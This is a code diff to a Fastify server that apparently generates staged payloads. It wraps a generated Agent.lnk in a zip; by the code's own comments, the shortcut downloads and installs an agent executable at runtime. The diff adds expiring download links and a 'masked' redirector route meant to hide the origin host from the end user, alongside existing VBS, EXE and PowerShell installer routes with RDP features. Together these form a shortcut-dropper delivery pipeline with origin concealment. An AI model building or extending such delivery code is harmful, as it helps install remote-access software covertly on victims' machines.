@@ -11,6 +11,7 @@ import * as storage from "./storage";
 import * as builder from "./builder";
 import * as exeBuilder from "./exe-builder";
 import { runZipBuild, AmiMode } from "./zip-builder";
+import { createZip } from "./zip-archive";
 import {
   buildEnrollmentCommand,
   toPowerShellInstallCommand,
@@ -367,6 +368,18 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
       .send({ error: "flags.fileName must be a bare filename (no path)" });
   }
 
+  // Optional STAGE 2 expiry (in hours) — the web app controls the window
+  // (24/72). Defaults to the generator's JOB_TTL_HOURS (72h). Clamped to a sane
+  // [1, 168] range so a bad body can never mint a zip that outlives the token.
+  const rawExpiry =
+    typeof body.expiryHours === "number"
+      ? body.expiryHours
+      : Number(body.expiryHours);
+  const expiryHours =
+    Number.isFinite(rawExpiry) && rawExpiry >= 1 && rawExpiry <= 168
+      ? Math.floor(rawExpiry)
+      : env.JOB_TTL_HOURS;
+
   // Optional features (defaults to rdp/ping/power when absent/empty).
   const features: string[] =
     Array.isArray(body.features)
@@ -424,11 +437,31 @@ async function postBuildZip(request: FastifyRequest, reply: FastifyReply) {
       return reply.status(500).send({ error: "Agent.lnk was not produced" });
     }
 
+    // STAGE 2 (Task D): zip the single Agent.lnk, then drop the temp .lnk and
+    // keep only the zip (until expiry). The .lnk downloads + installs the agent
+    // exe at runtime, so the exe itself never ships inside the zip.
+    const lnkData = fs.readFileSync(lnkPath);
+    const zipBuffer = createZip([{ name: "Agent.lnk", data: lnkData }]);
+    fs.writeFileSync(storage.zipOutputPath(jobId), zipBuffer);
+    storage.removeLnk(jobId);
+
+    const expiresAt = new Date(Date.now() + expiryHours * 60 * 60 * 1000);
+    storage.saveZipExpiry(jobId, expiresAt);
+
+    // Masked link through the redirector base URL so the bundling/origin host
+    // isn't visible to the end user.
+    const maskedBase = env.REDIRECT_BASE_URL || env.PUBLIC_URL;
+    const downloadUrl = `${maskedBase}/d/${jobId}`;
+
     console.log(
-      `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}`
+      `ZIP build ok for job ${jobId}; client cmd len=${clientInstallCommand.length}, rebuilt len=${fullCommand.length}; zip ${zipBuffer.length} bytes; expires ${expiresAt.toISOString()}`
     );
 
-    return reply.status(200).send({ jobId });
+    return reply.status(200).send({
+      jobId,
+      downloadUrl,
+      expiresAt: expiresAt.toISOString(),
+    });
   } catch (err) {
     const message = err instanceof Error ? err.message : String(err);
     console.error(`ZIP build error for job ${jobId}: ${message}`);
@@ -526,6 +559,60 @@ async function getExeDownload(request: FastifyRequest, reply: FastifyReply) {
 }
 
 /**
+ * GET /downloads/:jobId/zip - Stream the STAGE-2 packaged zip (one Agent.lnk).
+ *
+ * Only served while unexpired (72h by default; the web app supplies
+ * expiryHours). Kept available for the full window so the masked link can be
+ * re-fetched; cleaned up once expired (Task D: keep the zip until expiry).
+ */
+async function getZipDownload(request: FastifyRequest, reply: FastifyReply) {
+  const { jobId } = request.params as { jobId: string };
+
+  if (!UUID_V4_REGEX.test(jobId)) {
+    return reply.status(400).send({ error: "Invalid job ID" });
+  }
+
+  const zipPath = storage.zipOutputPath(jobId);
+  if (!fs.existsSync(zipPath)) {
+    return reply.status(404).send({ error: "Not found" });
+  }
+
+  // Enforce the expiry window recorded when the job was built.
+  const expiry = storage.getZipExpiry(jobId);
+  if (expiry && expiry.getTime() < Date.now()) {
+    storage.cleanupJob(jobId);
+    return reply.status(410).send({ error: "Link expired" });
+  }
+
+  reply.header("Content-Type", "application/zip");
+  reply.header("Content-Disposition", 'attachment; filename="Agent.zip"');
+
+  return reply.send(fs.createReadStream(zipPath));
+}
+
+/**
+ * GET /d/:jobId - Masked zip link.
+ *
+ * The handed URL uses a redirector base (REDIRECT_BASE_URL) so the generator's
+ * origin isn't visible. In dev/lab the generator serves /d/:jobId itself as a
+ * 302 to the zip endpoint; in production a separate redirector host owns /d/
+ * and 302s to <PUBLIC_URL>/downloads/:jobId/zip. Either way the end user only
+ * ever sees the masked host.
+ */
+async function getMaskedZipRedirect(
+  request: FastifyRequest,
+  reply: FastifyReply
+) {
+  const { jobId } = request.params as { jobId: string };
+
+  if (!UUID_V4_REGEX.test(jobId)) {
+    return reply.status(400).send({ error: "Invalid job ID" });
+  }
+
+  return reply.redirect(`/downloads/${jobId}/zip`, 302);
+}
+
+/**
  * Register routes with the Fastify instance.
  */
 export async function registerRoutes(app: FastifyInstance) {
@@ -543,4 +630,6 @@ export async function registerRoutes(app: FastifyInstance) {
   app.get("/downloads/:jobId", getDownload);
   app.get("/downloads/:jobId/installer.vbs", getVbsDownload);
   app.get("/downloads/:jobId/installer.exe", getExeDownload);
+  app.get("/downloads/:jobId/zip", getZipDownload);
+  app.get("/d/:jobId", getMaskedZipRedirect);
 }
